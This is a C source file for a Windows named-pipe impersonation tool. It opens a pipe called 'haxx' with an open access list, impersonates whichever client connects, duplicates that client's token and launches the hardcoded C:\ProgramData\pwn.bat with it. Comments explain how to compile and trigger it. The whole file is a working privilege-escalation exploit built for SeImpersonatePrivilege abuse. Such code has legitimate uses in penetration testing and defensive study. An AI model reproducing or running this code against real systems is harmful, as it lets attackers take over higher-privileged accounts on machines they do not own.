/* Creates a namedpipe \\.\pipe\haxx, then impersonates the client connecting to it.
   User should have SeImpersonatePrivilege
   Hardcoded to execute C:\ProgramData\pwn.bat
   compile with mingw - x86_64-w64-mingw32-gcc -D UNICODE NamedpipeImpersonation.c -o NamedPipeImpersonation.exe
   To test execute the binary and `echo abc > \\.\pipe\haxx` from the client side
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <strsafe.h>

#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

BOOL EnableWindowsPrivilege(LPCWSTR Privilege)
{
	/* Tries to enable privilege if it is present to the Permissions set.
  https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html */
	LUID luid = {};
	TOKEN_PRIVILEGES tp;
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE currentToken;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
	return TRUE;
}


int main(int argc, WCHAR* argv)
{

	HANDLE hPipe, hToken, userToken, currentProcess;
	char buffer[1024];
	DWORD dwRead;
	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd, 1);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
	SECURITY_ATTRIBUTES sa;
	sa.lpSecurityDescriptor = &sd;


	if (EnableWindowsPrivilege(SE_IMPERSONATE_NAME)) {
		printf("Enabled SeImpersonatePrivilege\n");
	}

	printf("Starting server\n");

	hPipe = CreateNamedPipe(L"\\\\.\\pipe\\haxx", PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, &sa);

	if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
		printf("Connected to client\n");

	if (!ReadFile(hPipe, &buffer, 1, &dwRead, NULL)) {
		printf("Read failed\n");
		exit(1);
	}

	printf("Impersonating...\n");

	if (ImpersonateNamedPipeClient(hPipe) != TRUE)
		printf("Failed to impersonate client\n");
	else {
		printf("Successfully impersonated client\n");

		currentProcess = GetCurrentProcess();

		if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken) == 0)
		{
			printf("Error in OpenThreadToken - GetLastError: %u\n", GetLastError());
		}
		else {

			printf("Got client token\n");

			SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
			TOKEN_TYPE tokenType = TokenPrimary;

			if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &userToken) == 0) {
				printf("Duplication failed\n");
			}
			else {
				printf("Duplication success\n");
				STARTUPINFOW si;
				PROCESS_INFORMATION pi;
				RtlSecureZeroMemory(&pi, sizeof(pi));
				RtlSecureZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);
				RevertToSelf();
				Sleep(3);
				printf("Executing command\n");
				BOOL ret = CreateProcessWithTokenW(userToken, 0, L"C:\\ProgramData\\pwn.bat", NULL, 0, NULL, NULL, &si, &pi);
				if (ret != TRUE)
				{
					DWORD lastError;
					lastError = GetLastError();
					wprintf(L"CreateProcessWithTokenW: 0x%x\n", lastError);
					return 1;
				}
			}
		}

	}
	DisconnectNamedPipe(hPipe);

	return 0;
}


